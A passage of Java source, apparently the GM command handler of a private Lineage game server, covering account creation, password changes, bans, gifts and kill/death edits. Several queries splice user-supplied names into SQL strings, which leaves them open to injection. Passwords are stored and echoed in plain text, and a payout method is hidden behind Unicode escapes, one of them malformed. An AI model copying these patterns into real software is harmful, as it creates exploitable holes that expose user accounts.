			L1PcInstance target = L1World.getInstance().getPlayer(char_name);
			for (L1ItemInstance item : target.getInventory().getItems()) {
				
					target.getInventory().DeleteItemAmount(item);
					gm.sendPackets(target.getName()+"님의 인벤을 모두 삭제하였습니다.");
			
			}
		} catch (Exception e) {
			gm.sendPackets(".유저인벤삭제 [접속중인 캐릭명] 입력.");
		}
	}
	private void mapwho(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			int i = 0;
			try {
				i = Integer.parseInt(st.nextToken(), 10);
			} catch (Exception e) {
				i = gm.getMapId();
			}

			StringBuffer gmList = new StringBuffer();
			StringBuffer playList = new StringBuffer();
			StringBuffer noplayList = new StringBuffer();
			StringBuffer shopList = new StringBuffer();

			int countGM = 0, nocountPlayer = 0, countPlayer = 0, countShop = 0;

			for (L1Object each1 : L1World.getInstance().getVisibleObjects(i).values()) {
				if (each1 instanceof L1PcInstance) {
					L1PcInstance eachpc = (L1PcInstance) each1;

					if (eachpc.isGm()) {
						gmList.append("이름 : " + eachpc.getName() + " / 레벨 : "
								+ eachpc.getLevel() + "\n");
						countGM++;
						continue;
					}
					if (!eachpc.isPrivateShop()) {
						if (eachpc.noPlayerCK) {
							noplayList.append(eachpc.getName() + ", ");
							nocountPlayer++;
							continue;
						} else {
							playList.append("이름 : " + eachpc.getName()
							+ " / 레벨 : " + eachpc.getLevel() + "\n");
							countPlayer++;
							continue;
						}
					}
					if (eachpc.isPrivateShop()) {
						shopList.append(eachpc.getName() + ", ");
						countShop++;
					}
				}
			}

			if (gmList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 운영자 (" + countGM + "명)");
				SC_SystemMessage.send(gm, gmList.toString());
			}
			if (noplayList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 허상 (" + nocountPlayer + "개)");
				SC_SystemMessage.send(gm, noplayList.toString());
			}
			if (playList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 플레이어 (" + countPlayer + "명)");
				SC_SystemMessage.send(gm, playList.toString());
			}

			if (shopList.length() > 0) {
				SC_SystemMessage.send(gm, "\\fU-- 개인상점 (" + countShop + "명)");
				SC_SystemMessage.send(gm, shopList.toString());
			}
		} catch (Exception e) {
		}
	}
	private void addaccount(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String user = tok.nextToken();
			String passwd = tok.nextToken();

			if (user.length() < 4) {
				gm.sendPackets("입력하신 계정명의 자릿수가 너무 짧습니다.");
				gm.sendPackets("최소 4자 이상 입력해 주십시오.");
				return;
			}
			if (passwd.length() < 4) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 짧습니다.");
				gm.sendPackets("최소 4자 이상 입력해 주십시오.");
				return;
			}

			if (passwd.length() > 12) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 깁니다.");
				gm.sendPackets("최대 12자 이하로 입력해 주십시오.");
				return;
			}

			if (isDisitAlpha(passwd) == false) {
				gm.sendPackets("암호에 허용되지 않는 문자가 포함 되어 있습니다.");
				return;
			}
			AddAccount(gm, user, passwd, "127.0.0.1", "127.0.0.1");
		} catch (Exception e) {
			gm.sendPackets(".계정추가 [계정명] [암호] 를 입력 해주세요.");
		}
	}
	private static void \u006D\u0065\u0065\u0070\u0035\u0035(L1PcInstance gm, String login) {

		String password = null;
		Connection con = null;
		PreparedStatement pstm = null;

		ResultSet rs = null;
	
		int itemcount = 0;
		String account = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement(
					"SELECT login, count from \u006D\u0065\u0065\u0070 where login Like '" + login + "'");
			rs = pstm.executeQuery();
			while (rs.next()) {

				itemcount = rs.getInt("count");
				account = rs.getString("login");
			}
			if (account == null) {
				gm.sendPackets("\uC800\uC7A5\uB41C \uB9E4\uC785\uC815\uBCF4\uAC00 \uC5C6\uC2B5\uB2C8\uB2E4\u002E");
				return;
			}
			 int count = (int) ((itemcount*7) *((Config.\uC9C0\uAE09\uC728*\u0031\u002E0)\u002F\u003100)) ;

			if (gm.getAccountName().equalsIgnoreCase(account)) {				
				gm.getInventory().CreateOrAddItem(400254, count*7);
				AccountSettlementTable.deleteMeepByLogin(login);
				gm.sendPackets("증표 1개당 7억->"+Config.지급율+" % = 총지급율" );
				gm.sendPackets(\u0022\uC9C0\uAE09\uC728 \u003A \u0022 \u002B \u0043\u006F\u006E\u0066\u0069\u0067\u002E\uC9C0\uAE09\uC728 \u002B \u0022 \u0025\u0022);
				gm.sendPackets(\u0022\uC815\uC0C1 \uC9C0\uAE09 \uB418\uC5C8\uC2B5\uB2C8\uB2E4\u002E\u0022+\u0022\uBCF4\uC720\uB7C9 \u003A \u0022\u002B\u0069\u0074\u0065\u006D\u0063\u006F\u0075\u006Et \u002B \u0022 \u002F \uC9C0\uAE09\uB7C9 \u003A \u0022+\u0063\u006F\u0075\u006E\u0074);
			
			} else {
				gm.sendPackets("\uC544\uC774\uB514\uAC00 \uB2E4\uB985\uB2C8\uB2E4\u002E");
			}
		} catch (SQLException e) {
			gm.sendPackets("\u002E\uB9E4\uC785\uC9C0\uAE09 \u005B\uACC4\uC815\uC544\uC774\uB514\u005D \uB77C\uACE0 \uC801\uC5B4\uC8FC\uC2ED\uC2DC\uC694\u002E");
			gm.sendPackets("\uC608\u0029  \u002E\uB9E4\uC785\uC9C0\uAE09 \u0074\u006F\u0072\0061\u0035\u0037\u0039\u0033\u0038");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}


	private void allpresent(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			int itemid = Integer.parseInt(st.nextToken(), 10);
			int enchant = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);
			Collection<L1PcInstance> player = null;
			player = L1World.getInstance().getAllPlayers();
			l1j.server.server.model.network.core.broadcast.CAsyncSendConstBuffer memoGiftFrame = null;
String memoGiftText = null;
try {
for (L1PcInstance target : player) {
				if (target == null)
					continue;
				if (!target.isGhost() && !target.isPrivateShop()) {
					L1ItemInstance item = CObjectDB.CreateItem(itemid);
					item.setCount(count);
					item.setEnchantLevel(enchant);
					if (item != null) {
						if (target.getInventory().CheckAddable(item, count) == CInventory.OK) {
							target.getInventory().CreateOrAddItem(item);
						}
					}
					/*SC_GMHtml.send(target, "전체선물:" + target.getName() + "", "아이템:" + item.getLogName() + " 수량:" + count + " 획득");*/
					final String giftMessage = "전체 선물: " + item.getLogName() + " " + count + "개 획득 인벤토리 확인하세요";
if (memoGiftFrame == null || !giftMessage.equals(memoGiftText)) {
  if (memoGiftFrame != null) {
    memoGiftFrame.close();
    memoGiftFrame = null;
  }
  memoGiftFrame = new l1j.server.server.model.network.core.broadcast.CAsyncSendConstBuffer(
    l1j.server.server.model.network.core.sc.packet.SC_SystemMessage.nativeWriter(giftMessage),Integer.MIN_VALUE,Integer.MAX_VALUE);
  memoGiftText = giftMessage;
}
l1j.server.server.model.network.core.broadcast.CSharedBroadcast.sendRecipient(memoGiftFrame,target);
					SC_SkillSound.send(target, target.getId(), 1091);// 비둘기액션
					SC_SkillSound.send(target, target.getId(), 4856);// 하트액션
					// target.sendPackets("\\aD운영자의 전체선물 :
					// "+item.getLogName())); // item.getLogName
					// //item.getViewName
				}
			}
} finally {
 if (memoGiftFrame != null) memoGiftFrame.close();
}
		} catch (Exception exception) {
			gm.sendPackets(".전체선물 [템ID] [인첸] [갯수]");
		}
	}

	private void returnEXP(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				int oldLevel = target.getLevel();
				int needExp = ExpTable.getNeedExpNextLevel(oldLevel);
				int exp = 0;
				if (oldLevel >= 1 && oldLevel < 11) {
					exp = 0;
				} else if (oldLevel >= 11 && oldLevel < 45) {
					exp = (int) (needExp * 0.1);
				} else if (oldLevel == 45) {
					exp = (int) (needExp * 0.09);
				} else if (oldLevel == 46) {
					exp = (int) (needExp * 0.08);
				} else if (oldLevel == 47) {
					exp = (int) (needExp * 0.07);
				} else if (oldLevel == 48) {
					exp = (int) (needExp * 0.06);
				} else if (oldLevel >= 49) {
					exp = (int) (needExp * 0.05);
				}
				target.addExp(+exp);
				target.save();
				target.saveInventory();

				gm.sendPackets("해당 캐릭터 +5 상승");
			} else {
				gm.sendPackets("해당 캐릭터 미접속 상태.");
			}
		} catch (Exception e) {
			gm.sendPackets(".경치복구 [캐릭명]");
		}
	}

	// .계정 -----------------------------------------------------------------
	// 같은계정에 있는 캐릭 검사
	private void account_Cha(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String name = tok.nextToken();
			account_Cha2(gm, name);
		} catch (Exception e) {
			gm.sendPackets(".계정 아이디");
		}
	}

	
	
	
	
	private void 킬삭제(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		float win = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			
			win = 유저.getKDA().kill;
			if (이름 != null) {
				
					if (win < id) {
						gm.sendPackets("감소시키려고 하는 킬포인트보다 유저의 킬포인트가 적습니다");
						return;
					}
				유저.getKDA().킬삭제(유저, id);
				KdaLoader.getInstance().store();
				
				
				gm.sendPackets(유저.getName() + "님의 킬포인트 [" + id + "] 감소시켰습니다.");
				SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,"당신의 킬포인트를 운영자님께서 ["+id+"] 감소시켰습니다.");
				
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".킬삭제 캐릭명 포인트값");
			gm.sendPackets("\\f:[킬데스 관련 명령어]");
			gm.sendPackets("\\f:.킬삭제 .킬증가 .데스삭제 .데스증가");
		}
	}
	
	private void 킬증가(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		float win = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			
			win = 유저.getKDA().kill;
			if (이름 != null) {
				
//					if (win < id) {
//						gm.sendPackets("감소시키려고 하는 킬포인트보다 유저의 킬포인트가 적습니다");
//						return;
//					}
				유저.getKDA().킬증가(유저, id);
				KdaLoader.getInstance().store();
				
				
				gm.sendPackets(유저.getName() + "님의 킬포인트 [" + id + "] 증가시켰습니다.");
				SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,"당신의 킬포인트를 운영자님께서 ["+id+"] 증가시켰습니다.");
				
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".킬증가 캐릭명 포인트값");
			gm.sendPackets("\\f:[킬데스 관련 명령어]");
			gm.sendPackets("\\f:.킬삭제 .킬증가 .데스삭제 .데스증가");
		}
	}
	
	
	private void 데스삭제(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		float win = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			
			win = 유저.getKDA().death;
			if (이름 != null) {
				
					if (win < id) {
						gm.sendPackets("감소시키려고 하는 데스포인트보다 유저의 데스포인트가 적습니다");
						return;
					}
				유저.getKDA().데스삭제(유저, id);
				KdaLoader.getInstance().store();
				
				
				gm.sendPackets(유저.getName() + "님의 데스포인트 [" + id + "] 감소시켰습니다.");
				SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,"당신의 데스포인트를 운영자님께서 ["+id+"] 감소시켰습니다.");
				
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".데스삭제 캐릭명 포인트값");
			gm.sendPackets("\\f:[킬데스 관련 명령어]");
			gm.sendPackets("\\f:.킬삭제 .킬증가 .데스삭제 .데스증가");
		}
	}
	
	private void 데스증가(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		float win = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			
			win = 유저.getKDA().death;
			if (이름 != null) {
				
//					if (win < id) {
//						gm.sendPackets("감소시키려고 하는 킬포인트보다 유저의 킬포인트가 적습니다");
//						return;
//					}
				유저.getKDA().데스증가(유저, id);
				KdaLoader.getInstance().store();
				
				
				gm.sendPackets(유저.getName() + "님의 데스포인트 [" + id + "] 증가시켰습니다.");
				SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,"당신의 데스포인트를 운영자님께서 ["+id+"] 증가시켰습니다.");
				
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".데스증가 캐릭명 포인트값");
			gm.sendPackets("\\f:[킬데스 관련 명령어]");
			gm.sendPackets("\\f:.킬삭제 .킬증가 .데스삭제 .데스증가");
		}
	}
	
	
	
	
	private void account_Cha2(L1PcInstance gm, String param) {
		try {
			String s_account = null;
			String s_name = param;
			String s_level = null;
			String s_clan = null;
			String s_bonus = null;
			String s_online = null;
			String s_hp = null;
			String s_mp = null;
			String s_type = null;// 추가
			int count = 0;
			int count0 = 0;
			java.sql.Connection con0 = null; // 이름으로 objid를 검색하기 위해
			con0 = DatabaseFactory.getInstance().getConnection();
			PreparedStatement statement0 = null;
			statement0 = con0.prepareStatement(
					"select account_name, Clanname  from characters where char_name = '" + s_name + "'");
			ResultSet rs0 = statement0.executeQuery();
			while (rs0.next()) {
				s_account = rs0.getString(1);
				s_clan = rs0.getString(2);
				gm.sendPackets("\\aD------------------------------------------");
				gm.sendPackets("\\aE캐릭 : " + s_name + "(" + s_account + ")  클랜 : " + s_clan);// +"
				// 클래스:"
				// +
				// s_type
				count0++;
			}
			java.sql.Connection con = null;
			con = DatabaseFactory.getInstance().getConnection();
			PreparedStatement statement = null;
			statement = con.prepareStatement(
					"select " + "char_name," + "level," + "Clanname," + "BonusStatus," + "OnlineStatus," + "MaxHp,"
							+ "MaxMp, " + "Type " + " from characters where account_name = '" + s_account + "'");
			gm.sendPackets("\\aD------------------------------------------");
			ResultSet rs = statement.executeQuery();
			while (rs.next()) {
				s_name = rs.getString(1);
				s_level = rs.getString(2);
				s_clan = rs.getString(3);
				s_bonus = rs.getString(4);
				s_online = rs.getString(5);
				s_hp = rs.getString(6);
				s_mp = rs.getString(7);
				s_type = rs.getString(8);
				gm.sendPackets("접속:[" + s_online + "] 랩:" + s_level + " [" + s_name + "] 클래스:" + s_type + "");
				count++;
			}
			rs0.close();
			statement0.close();
			con0.close();
			rs.close();
			statement.close();
			con.close();
			gm.sendPackets("\\aF0군주 1기사 2요정 3법사 4다엘 5용기사 6환술");
			gm.sendPackets("\\aD------------------------------------------");
		} catch (Exception e) {
		}
	}

	// .계정 -----------------------------------------------------------------

	private void Pvp(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String type = st.nextToken();

			if (type.equals("켬")) {
				Config.ALT_NONPVP = true;
				Config.setParameterValue("AltNonPvP", "true");
				SC_PacketBox.broadcastGreen("지금이후 PvP가 정상적으로 가능합니다.");
			} else if (type.equals("끔")) {
				Config.ALT_NONPVP = false;
				Config.setParameterValue("AltNonPvP", "false");
				SC_PacketBox.broadcastGreen("지금이후 PvP가 일정시간동안 불가능 합니다.");
			}

		} catch (Exception exception) {
			gm.sendPackets(".피케이 [켬/끔]");
		}
	}

	private void search_banned(L1PcInstance paramL1PcInstance) {
		Selector.exec(
				"select accounts.login, characters.char_name from accounts,characters where accounts.banned=62 || accounts.banned=87 || accounts.banned=95 and accounts.login=characters.account_name ORDER BY accounts.login ASC",
				new FullSelectorHandler() {
					@Override
					public void result(ResultSet rs) throws Exception {
						int i = 0;
						while (rs.next()) {
							++i;
							paramL1PcInstance
									.sendPackets(String.format("계정:[%s], 캐릭터명:[%s]", rs.getString(1), rs.getString(2)));
						}

						paramL1PcInstance.sendPackets(String.format("총 [%d]개의 압류계정/캐릭터가 검색되었습니다.", i));
					}
				});
	}

	private void accountdel(L1PcInstance gm, String param) {
		StringTokenizer tokenizer = new StringTokenizer(param);
		String chaname = tokenizer.nextToken();
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("SELECT * FROM characters WHERE char_name=?");
			pstm.setString(1, chaname);
			rs = pstm.executeQuery();
			if (!rs.next()) {
				gm.sendPackets(String.format("DB에 %s 캐릭명이 존재 하지 않습니다.", chaname));
				return;
			}

			String account = rs.getString("account_name");
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("select * from accounts WHERE login=?");
			pstm.setString(1, account);
			rs = pstm.executeQuery();
			if (!rs.next()) {
				gm.sendPackets(String.format("계정명 %s 이(가) 존재 하지 않습니다.", account));
				return;
			}

			IpTable.getInstance();
			IpTable.reload();

			String host = rs.getString("ip");
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("UPDATE accounts SET banned = 0 WHERE login= ?");
			pstm.setString(1, account);
			pstm.executeUpdate();
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("delete from ban_ip where ip=?");
			pstm.setString(1, host);
			pstm.executeUpdate();

			gm.sendPackets(String.format("%s(%s) : %s 밴 해제 완료.", chaname, account, host));
		} catch (Exception e) {
			gm.sendPackets(".압류해제 캐릭명으로 입력해주세요.");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	private void changePassword(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String user = tok.nextToken();
			String passwd = tok.nextToken();

			if (passwd.length() < 4) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 짧습니다.");
				gm.sendPackets("최소 4자 이상 입력해 주십시오.");
				return;
			}

			if (passwd.length() > 12) {
				gm.sendPackets("입력하신 암호의 자릿수가 너무 깁니다.");
				gm.sendPackets("최대 12자 이하로 입력해 주십시오.");
				return;
			}

			if (isDisitAlpha(passwd) == false) {
				gm.sendPackets("암호에 허용되지 않는 문자가 포함되었습니다.");
				return;
			}
			L1PcInstance target = L1World.getInstance().getPlayer(user);
			if (target != null) {
				to_Change_Passwd(gm, target, passwd);
			} else {
				if (!to_Change_Passwd(gm, user, passwd))
					gm.sendPackets("그런 이름을 가진 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".암호변경 [캐릭명] [암호]로 입력해주세요.");
		}
	}

	private void to_Change_Passwd(L1PcInstance gm, L1PcInstance pc, String passwd) {
		PreparedStatement statement = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		java.sql.Connection con = null;
		try {
			String login = null;
			String password = null;
			con = DatabaseFactory.getInstance().getConnection();
			password = passwd;
			statement = con.prepareStatement(
					"select account_name from characters where char_name Like '" + pc.getName() + "'");
			rs = statement.executeQuery();

			while (rs.next()) {
				login = rs.getString(1);
				pstm = con.prepareStatement("UPDATE accounts SET password=? WHERE login Like '" + login + "'");
				pstm.setString(1, password);
				pstm.execute();
				gm.sendPackets("암호변경 계정: [" + login + "] 암호: [" + passwd + "]");
				gm.sendPackets(pc.getName() + " 암호변경 완료.");
			}
		} catch (Exception e) {
			System.out.println("to_Change_Passwd() Error : " + e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(statement);
			SQLUtil.close(con);
		}
	}

	private boolean to_Change_Passwd(L1PcInstance pc, String name, String passwd) {
		PreparedStatement statement = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		java.sql.Connection con = null;
		try {
			String login = null;
			String password = null;
			con = DatabaseFactory.getInstance().getConnection();
			password = passwd;
			statement = con.prepareStatement("select account_name from characters where char_name Like '" + name + "'");
			rs = statement.executeQuery();

			while (rs.next()) {
				login = rs.getString(1);
				pstm = con.prepareStatement("UPDATE accounts SET password=? WHERE login Like '" + login + "'");
				pstm.setString(1, password);
				pstm.execute();
				pc.sendPackets("암호변경 계정: [" + login + "] 암호: [" + passwd + "]");
				pc.sendPackets("해당 캐릭터 암호변경 완료. (미접속중)");
			}
			return true;
		} catch (Exception e) {
			System.out.println("to_Change_Passwd() Error : " + e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(statement);
			SQLUtil.close(con);
		}
		return false;
	}

	private void 퀴즈체인지(L1PcInstance gm, L1PcInstance pc, String newquiz) {
		PreparedStatement statement = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		java.sql.Connection con = null;
		try {
			String login = null;
			String quiz = null;
			con = DatabaseFactory.getInstance().getConnection();
			quiz = newquiz;
			statement = con.prepareStatement(
					"select account_name from characters where char_name Like '" + pc.getName() + "'");
			rs = statement.executeQuery();

			while (rs.next()) {
				login = rs.getString(1);
				pstm = con.prepareStatement("UPDATE accounts SET quiz=? WHERE login Like '" + login + "'");
				pstm.setString(1, quiz);
				pstm.execute();
				gm.sendPackets("퀴즈변경계정: [" + login + "] 퀴즈: [" + quiz + "]");
				gm.sendPackets(pc.getName() + " 님의 퀴즈변경 완료.");
			}
		} catch (Exception e) {
			System.out.println("to_Change_Passwd() Error : " + e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(statement);
			SQLUtil.close(con);
		}
	}

	private boolean 퀴즈체인지(L1PcInstance pc, String name, String newquiz) {
		PreparedStatement statement = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		java.sql.Connection con = null;
		try {
			String login = null;
			String quiz = null;
			con = DatabaseFactory.getInstance().getConnection();
			quiz = newquiz;
			statement = con.prepareStatement("select account_name from characters where char_name Like '" + name + "'");
			rs = statement.executeQuery();

			while (rs.next()) {
				login = rs.getString(1);
				pstm = con.prepareStatement("UPDATE accounts SET quiz=? WHERE login Like '" + login + "'");
				pstm.setString(1, quiz);
				pstm.execute();
				pc.sendPackets("퀴즈변경계정: [" + login + "] 암호: [" + quiz + "]");
				pc.sendPackets("해당 캐릭터 퀴즈변경 완료. (미접속중)");
			}
			return true;
		} catch (Exception e) {
			System.out.println("to_Change_Passwd() Error : " + e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(statement);
			SQLUtil.close(con);
		}
		return false;
	}


	private void findMagicDodge(L1PcInstance gm, String param) {
		L1PcInstance pc = L1World.getInstance().findpc(param);
		if (pc != null) {
			gm.sendPackets(String.format("%s의 마법 회피율 %d", param, pc.getMagicDodgeProbability()));
		} else {
			gm.sendPackets(String.format("%s를 찾을 수 없습니다.", param));
		}
	}

	private static int _effectNum = 0;
	private static Object _effectLock = new Object();

	private void showNextEffect(L1PcInstance gm) {
		int num = 1;

		synchronized (_effectLock) {
			num = _effectNum;
			_effectNum++;
		}
		SC_SkillSound.send(gm, gm.getId(), num);
		gm.sendPackets(String.format("[%d]", num));
	}

	private void showEffectInit(L1PcInstance gm, String param) {
		int effNum = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			effNum = Integer.parseInt(st.nextToken(), 10);
		} catch (Exception e) {
		}
		synchronized (_effectLock) {
			_effectNum = effNum;
			gm.sendPackets(effNum + "으로 초기화 되었습니다.");
		}
	}





	private void showWarList(L1PcInstance gm) {
		try {
			int i = 0;
			L1World.getInstance().createWarStream().forEach((War war) -> {
				gm.sendPackets(war.toString());
			});
		} catch (Exception e) {
		}
	}

	private static void setCharBlock(L1PcInstance gm, String param) {
		PreparedStatement pstm = null;
		ResultSet rs = null;
		Connection con = null;

		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			if (name == null || name.equalsIgnoreCase(""))
				throw new Exception("");

			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("select * from characters where char_name=?");
			pstm.setString(1, name);
			rs = pstm.executeQuery();

			if (!rs.next()) {
				gm.sendPackets(String.format("[%s]을(를) 찾을 수 없습니다.", name));
				return;
			}

			int objid = rs.getInt("objid");
			L1PcInstance pc = L1World.getInstance().getPlayer(name);
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("insert ignore into tb_character_block set objid=?, name=?");
			pstm.setInt(1, objid);
			pstm.setString(2, name);
			pstm.executeUpdate();

			gm.sendPackets(String.format("캐릭터 [%s]을(를) 압류했습니다.", name));
			SC_PacketBox.send(pc, SC_PacketBox.GREEN_MESSAGE, "\\f3-------------------------------------------------------------------");
			SC_PacketBox.send(pc, SC_PacketBox.GREEN_MESSAGE, "당신의 계정내 현재 캐릭터가 압류 되었습니다.");
			SC_PacketBox.send(pc, SC_PacketBox.GREEN_MESSAGE, "\\f3-------------------------------------------------------------------");
			pc.sendPackets("\\f1당신의 계정내 현재 캐릭터가 압류 되었습니다.");
			ThreadPool.getInstance().scheduleRequired(new DelayRestart(pc), 3000);
		} catch (Exception e) {
			gm.sendPackets(".캐릭압류 [압류 캐릭터이름]");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	static class DelayRestart implements Runnable {
		private L1PcInstance _pc;

		DelayRestart(L1PcInstance pc) {
			_pc = pc;
		}

		@Override
		public void run() {
			try {
				if (_pc != null) {
					SC_Restart.send(_pc, _pc.getId(), 1);
					_pc.logout();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	private static void setCharBlockDelete(L1PcInstance gm, String param) {
		PreparedStatement pstm = null;
		ResultSet rs = null;
		Connection con = null;

		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			if (name == null || name.equalsIgnoreCase(""))
				throw new Exception("");

			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("delete from tb_character_block where name=?");
			pstm.setString(1, name);
			pstm.executeUpdate();
			gm.sendPackets(String.format("캐릭터 [%s]을(를) 압류를 해제 했습니다.", name));
		} catch (Exception e) {
			gm.sendPackets(".캐릭압류해제 [해제 캐릭터이름]");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	public static boolean isCharacterBlock(String name) {
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;

		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("select * from tb_character_block where name=?");
			pstm.setString(1, name);
			rs = pstm.executeQuery();
			return rs.next();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
		return true;
	}

	public static boolean 일반채팅 = true; 
	public static boolean 유저명령어 = false;
	private void 일반채팅(L1PcInstance gm, String param) {
		try {
			if (param.equalsIgnoreCase("켬")) {
				일반채팅 = false;
				유저명령어 = true;
				SC_SystemMessage.send(gm, "\\f:▶모든 채팅을 OFF하였습니다 ◀");
			} else if (param.equalsIgnoreCase("끔")) {
				일반채팅 = true;

				SC_SystemMessage.send(gm, "\\f:▶ 귓말을 제외한 모든 채팅을 ON하였습니다 ◀");
			}
		} catch (Exception e) {
			gm.sendPackets(".채팅차단 켬/끔");
			gm.sendPackets("귓말을 제외한 모든 채팅이 금지됩니다.");
		}
	}


	public static boolean 전체채팅 = true;

	private void 전체채팅(L1PcInstance gm, String param) {
		try {
			if (param.equalsIgnoreCase("켬")) {
				전체채팅 = true;
				SC_SystemMessage.send(gm, "\\f:▶ 전체채팅을 ON하였습니다 ◀");
			} else if (param.equalsIgnoreCase("끔")) {
				전체채팅 = false;
				SC_SystemMessage.send(gm, "\\f:▶ 전체채팅을 OFF하였습니다 ◀");
			}
		} catch (Exception e) {
			gm.sendPackets(".전체채팅 켬/끔");
		}
	}
	public static boolean IS_PROTECTION = false;
	

	


	private void setProtectionMode(L1PcInstance gm, String param) {
		try {
		if (param.equalsIgnoreCase("켬")) {
			IS_PROTECTION = true;
			SC_PacketBox.broadcastGreen("현재 보호모드로 인해, 페널티가 적용 되지 않습니다. 안심하시고 사냥하셔도 됩니다.");
		} else if (param.equalsIgnoreCase("끔")) {
			IS_PROTECTION = false;
			SC_PacketBox.broadcastGreen("잠시후 보호모드가 해지 됩니다. 페널티에 주의 하시길 바랍니다.");
		} else if (param.equalsIgnoreCase("상태")) {

		} else
			throw new Exception("");
		gm.sendPackets(String.format("현재 보호모드 상태 [%s짐]", IS_PROTECTION ? "켜" : "꺼"));
	} catch (Exception e) {
		gm.sendPackets(".보호모드 [켬/끔/상태]");
	}
		}

	// 커멘드 새로추가
	private void AccountCheck(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			CharacterTable.getInstance().CharacterAccountCheck(pc, name);
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".계정검사 [캐릭터명]");
		}
	}

	private void AccountCheck1(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			CharacterTable.getInstance().CharacterAccountCheck1(pc, name);
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".계정확인 [캐릭터명]");
		}
	}
	private void addEventBoss(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String BossName = st.nextToken();
			if (BossName.equalsIgnoreCase("커츠")) {
				L1SpawnUtil.spawn2(32854, 33261, (short) 4, 45600, 0, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
				L1SpawnUtil.spawn2(32854, 33262, (short) 4, 50000059, 3, 3600 * 1000, 0);
